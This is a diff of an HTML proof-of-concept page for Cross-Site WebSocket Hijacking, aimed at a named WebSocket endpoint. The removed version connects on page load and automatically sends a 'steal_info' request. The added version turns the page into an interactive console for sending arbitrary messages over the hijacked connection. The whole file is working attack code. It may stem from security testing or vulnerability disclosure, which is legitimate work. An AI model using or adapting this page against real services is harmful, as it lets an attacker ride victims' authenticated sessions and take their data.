@@ -1,23 +1,77 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>CSWSH PoC - WebSocket Interactive</title>
+    <style>
+      body { font-family: monospace; padding: 20px; background: #f9f9f9; }
+      #log { white-space: pre-wrap; background: #eee; padding: 10px; border-radius: 5px; margin-top: 10px; max-height: 300px; overflow-y: scroll; }
+      input, button { padding: 5px 10px; font-size: 1em; margin: 5px 0; }
+    </style>
+  </head>
   <body>
-    <h3>CSWSH PoC - Exploit Victim Session</h3>
+    <h2>💥 CSWSH PoC - WebSocket Interactive Page</h2>
+
+    <p>Status: <span id="status">🔌 Connecting...</span></p>
+
+    <input type="text" id="msgInput" placeholder='Type message (e.g. {"action":"steal_info"})' style="width: 80%;" />
+    <button onclick="sendMsg()">Send</button>
+    <button onclick="reconnect()">🔄 Reconnect</button>
+
+    <div id="log"></div>
+
     <script>
-      const ws = new WebSocket("wss://web-sdk-dev.twi-cloud-services.com/connect");
-
-      ws.onopen = () => {
-        console.log("[+] Connected from evil site!");
-        ws.send(JSON.stringify({ action: "steal_info" }));
+      let ws;
+      const log = (msg) => {
+        const logDiv = document.getElementById("log");
+        logDiv.innerHTML += msg + "\n";
+        logDiv.scrollTop = logDiv.scrollHeight;
       };
 
-      ws.onmessage = (e) => {
-        console.log("[Server]:", e.data);
-        document.body.innerHTML += `<p>${e.data}</p>`;
-      };
+      const statusEl = document.getElementById("status");
 
-      ws.onerror = (e) => {
-        console.error("WebSocket Error:", e);
-      };
+      function connect() {
+        ws = new WebSocket("wss://web-sdk-dev.twi-cloud-services.com/connect");
+
+        ws.onopen = () => {
+          statusEl.textContent = "✅ Connected!";
+          log("[+] Connected to WebSocket server.");
+        };
+
+        ws.onmessage = (e) => {
+          log("[Server] → " + e.data);
+        };
+
+        ws.onerror = (e) => {
+          log("[!] Error: " + JSON.stringify(e));
+        };
+
+        ws.onclose = () => {
+          statusEl.textContent = "❌ Disconnected";
+          log("[x] WebSocket closed.");
+        };
+      }
+
+      function sendMsg() {
+        const input = document.getElementById("msgInput").value;
+        if (ws.readyState === WebSocket.OPEN) {
+          ws.send(input);
+          log("[You] → " + input);
+        } else {
+          log("[!] Cannot send, WebSocket not open.");
+        }
+      }
+
+      function reconnect() {
+        log("[~] Reconnecting...");
+        statusEl.textContent = "🔄 Reconnecting...";
+        try {
+          ws.close();
+        } catch (e) {}
+        connect();
+      }
+
+      // Connect on page load
+      connect();
     </script>
   </body>
 </html>
